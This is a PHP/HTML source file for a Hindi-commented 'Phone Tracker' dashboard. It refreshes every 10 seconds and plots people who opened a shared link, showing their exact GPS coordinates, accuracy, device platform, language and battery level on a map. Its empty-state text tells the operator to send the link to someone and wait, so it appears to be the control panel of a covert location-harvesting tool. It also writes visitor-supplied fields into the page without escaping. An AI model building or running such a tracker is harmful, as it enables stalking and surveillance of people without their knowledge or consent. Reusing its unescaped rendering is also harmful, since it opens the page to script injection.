<?php
/**
 * dashboard.php
 * लाइव लोकेशन डैशबोर्ड — किसी भी ब्राउज़र में खोलें
 */
require_once 'config.php';
?>
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📡 Phone Tracker Dashboard</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        
        body { display: flex; height: 100vh; background: #0f0f23; color: #fff; }
        
        #map {
            flex: 1; height: 100vh; z-index: 1;
        }
        
        .sidebar {
            width: 380px; background: #1a1a2e; padding: 20px;
            overflow-y: auto; border-left: 2px solid #16213e;
        }
        
        .sidebar h1 {
            font-size: 22px; margin-bottom: 5px; color: #e94560;
        }
        
        .sidebar .subtitle {
            font-size: 13px; color: #aaa; margin-bottom: 20px;
        }
        
        .stats {
            display: flex; gap: 10px; margin-bottom: 20px;
        }
        
        .stat-box {
            flex: 1; background: #16213e; padding: 12px; border-radius: 10px;
            text-align: center;
        }
        
        .stat-box .num { font-size: 24px; font-weight: bold; color: #e94560; }
        .stat-box .label { font-size: 11px; color: #888; margin-top: 3px; }
        
        .device-card {
            background: #16213e; border-radius: 10px; padding: 15px;
            margin-bottom: 10px; cursor: pointer;
            border-left: 4px solid #e94560; transition: 0.3s;
        }
        .device-card:hover { transform: translateX(-5px); background: #1a1a3e; }
        .device-card .vid { font-size: 14px; font-weight: bold; color: #fff; }
        .device-card .coords { font-size: 13px; color: #4ecca3; margin: 5px 0; }
        .device-card .meta { font-size: 11px; color: #888; }
        .device-card .time { font-size: 11px; color: #e94560; margin-top: 5px; }
        
        .badge {
            display: inline-block; padding: 2px 8px; border-radius: 10px;
            font-size: 10px; margin-top: 5px;
        }
        .badge-new { background: #4ecca3; color: #0f0f23; }
        .badge-old { background: #333; color: #888; }
        
        .search-box {
            width: 100%; padding: 10px; border-radius: 20px; border: none;
            background: #16213e; color: #fff; margin-bottom: 15px;
            outline: none; font-size: 14px;
        }
        .search-box::placeholder { color: #555; }
        
        .refresh-btn {
            width: 100%; padding: 12px; background: #e94560; color: #fff;
            border: none; border-radius: 25px; font-size: 14px; cursor: pointer;
            margin-top: 15px; transition: 0.3s;
        }
        .refresh-btn:hover { background: #c73650; }
        
        .live-dot {
            display: inline-block; width: 8px; height: 8px; background: #4ecca3;
            border-radius: 50%; animation: pulse 1.5s infinite; margin-right: 5px;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        
        /* Scrollbar */
        .sidebar::-webkit-scrollbar { width: 5px; }
        .sidebar::-webkit-scrollbar-track { background: #16213e; }
        .sidebar::-webkit-scrollbar-thumb { background: #e94560; border-radius: 10px; }
    </style>
</head>
<body>

<div id="map"></div>

<div class="sidebar" id="sidebar">
    <h1>📡 Phone Tracker</h1>
    <p class="subtitle">लाइव लोकेशन मॉनिटरिंग</p>
    
    <div class="stats">
        <div class="stat-box">
            <div class="num" id="totalVisitors">0</div>
            <div class="label">कुल विज़िटर</div>
        </div>
        <div class="stat-box">
            <div class="num" id="todayVisitors">0</div>
            <div class="label">आज के</div>
        </div>
        <div class="stat-box">
            <div class="num" id="gpsHits">0</div>
            <div class="label">GPS हिट्स</div>
        </div>
    </div>
    
    <input type="text" class="search-box" id="searchBox" 
           placeholder="🔍 विज़िटर ID से खोजें..." onkeyup="filterDevices()">
    
    <div id="deviceList"></div>
    
    <button class="refresh-btn" onclick="fetchData()">
        🔄 रिफ्रेश करें
    </button>
    <p style="text-align:center; margin-top:10px; font-size:11px; color:#555;">
        <span class="live-dot"></span> 
        लास्ट अपडेट: <span id="lastUpdate">कभी नहीं</span>
    </p>
</div>

<script>
// मैप सेट करें
const map = L.map('map').setView([22.9074, 79.0733], 5);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap'
}).addTo(map);

const markers = {};

// हर 10 सेकंड में डेटा लोड करें
setInterval(fetchData, 10000);
fetchData();

function fetchData() {
    fetch('track.php?action=get_locations')
        .then(res => res.json())
        .then(data => {
            if (!data || data.length === 0) {
                document.getElementById('deviceList').innerHTML = 
                    '<p style="text-align:center; color:#555; padding:40px 0;">कोई डेटा नहीं<br><small>लिंक किसी को भेजें और इंतज़ार करें...</small></p>';
                return;
            }
            
            updateMap(data);
            updateSidebar(data);
            updateStats(data);
            document.getElementById('lastUpdate').textContent = 
                new Date().toLocaleTimeString('hi-IN');
        })
        .catch(err => {
            console.error('Error:', err);
        });
}

function updateMap(locations) {
    locations.forEach(loc => {
        const lat = parseFloat(loc.latitude);
        const lng = parseFloat(loc.longitude);
        
        if (isNaN(lat) || isNaN(lng) || (lat === 0 && lng === 0)) return;
        
        // पुराना मार्कर हटाएँ
        if (markers[loc.visitor_id]) {
            map.removeLayer(markers[loc.visitor_id]);
        }
        
        // कस्टम आइकन
        const icon = L.divIcon({
            html: `<div style="
                background: #e94560;
                color: white; width: 30px; height: 30px;
                border-radius: 50%; display: flex;
                align-items: center; justify-content: center;
                font-size: 16px; border: 3px solid white;
                box-shadow: 0 2px 10px rgba(0,0,0,0.5);
            ">📍</div>`,
            className: '',
            iconSize: [30, 30],
            iconAnchor: [15, 15]
        });
        
        // अक्यूरेसी सर्कल
        const accuracy = parseFloat(loc.accuracy) || 50;
        L.circle([lat, lng], {
            radius: accuracy,
            color: '#e94560',
            fillColor: '#e94560',
            fillOpacity: 0.1
        }).addTo(map);
        
        const timeAgo = getTimeAgo(loc.timestamp);
        const platform = loc.platform || 'Unknown';
        const battery = loc.battery || 'N/A';
        
        markers[loc.visitor_id] = L.marker([lat, lng], { icon })
            .addTo(map)
            .bindPopup(`
                <b>🆔 ${loc.visitor_id.substring(0, 12)}...</b><br>
                📍 <b>${lat.toFixed(6)}, ${lng.toFixed(6)}</b><br>
                🎯 अक्यूरेसी: ${accuracy.toFixed(0)}m<br>
                🖥 ${platform}<br>
                🔋 ${battery}%<br>
                🕐 ${new Date(loc.timestamp * 1000).toLocaleString('hi-IN')}<br>
                🗺 <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank">गूगल मैप</a>
            `);
        
        // ज़ूम को ऑटो-एडजस्ट करें
        const allMarkers = Object.values(markers);
        if (allMarkers.length > 0) {
            const group = L.featureGroup(allMarkers);
            map.fitBounds(group.getBounds().pad(0.1), {maxZoom: 15});
        }
    });
}

function updateSidebar(locations) {
    const container = document.getElementById('deviceList');
    container.innerHTML = '';
    
    locations.forEach(loc => {
        const lat = parseFloat(loc.latitude);
        const lng = parseFloat(loc.longitude);
        const timeAgo = getTimeAgo(loc.timestamp);
        const isGPS = !(lat === 0 && lng === 0);
        
        const card = document.createElement('div');
        card.className = 'device-card';
        card.innerHTML = `
            <div class="vid">${isGPS ? '📍' : '🌐'} ${loc.visitor_id.substring(0, 15)}...</div>
            <div class="coords">${isGPS ? lat.toFixed(4) + ', ' + lng.toFixed(4) : '⚠️ केवल IP लोकेशन'}</div>
            <div class="meta">
                🖥 ${loc.platform || 'N/A'} | 
                🌐 ${loc.language || 'N/A'} | 
                🔋 ${loc.battery || 'N/A'}%<br>
                📐 ${loc.accuracy ? loc.accuracy + 'm' : 'N/A'}
            </div>
            <div>
                <span class="badge ${isGPS ? 'badge-new' : 'badge-old'}">
                    ${isGPS ? 'GPS' : 'IP Only'}
                </span>
                <span class="badge badge-old" style="margin-left:5px;">${timeAgo}</span>
            </div>
        `;
        
        card.onclick = () => {
            if (isGPS) {
                map.setView([lat, lng], 16);
                if (markers[loc.visitor_id]) {
                    markers[loc.visitor_id].openPopup();
                }
            }
        };
        
        container.appendChild(card);
    });
}

function updateStats(locations) {
    document.getElementById('totalVisitors').textContent = locations.length;
    
    const today = Math.floor(Date.now() / 1000) - 86400;
    const todayCount = locations.filter(l => l.timestamp > today).length;
    document.getElementById('todayVisitors').textContent = todayCount;
    
    const gpsCount = locations.filter(l => 
        parseFloat(l.latitude) !== 0 || parseFloat(l.longitude) !== 0
    ).length;
    document.getElementById('gpsHits').textContent = gpsCount;
}

function filterDevices() {
    const query = document.getElementById('searchBox').value.toLowerCase();
    const cards = document.querySelectorAll('.device-card');
    
    cards.forEach(card => {
        const text = card.textContent.toLowerCase();
        card.style.display = text.includes(query) ? 'block' : 'none';
    });
}

function getTimeAgo(timestamp) {
    const now = Math.floor(Date.now() / 1000);
    const diff = now - parseInt(timestamp);
    
    if (diff < 60) return 'अभी अभी';
    if (diff < 3600) return Math.floor(diff/60) + ' मिनट पहले';
    if (diff < 86400) return Math.floor(diff/3600) + ' घंटे पहले';
    return Math.floor(diff/86400) + ' दिन पहले';
}

// GPS असिस्टेड IP लोकेशन
function fetchIpLocation() {
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            // IP लोकेशन भी मैप पर दिखाएँ
            if (data.latitude && data.longitude) {
                L.circle([data.latitude, data.longitude], {
                    radius: 50000,
                    color: '#4ecca3',
                    fillColor: '#4ecca3',
                    fillOpacity: 0.05
                }).addTo(map).bindPopup(`🌐 IP Range: ${data.city}, ${data.country}`);
            }
        });
}
fetchIpLocation();
</script>

</body>
</html>
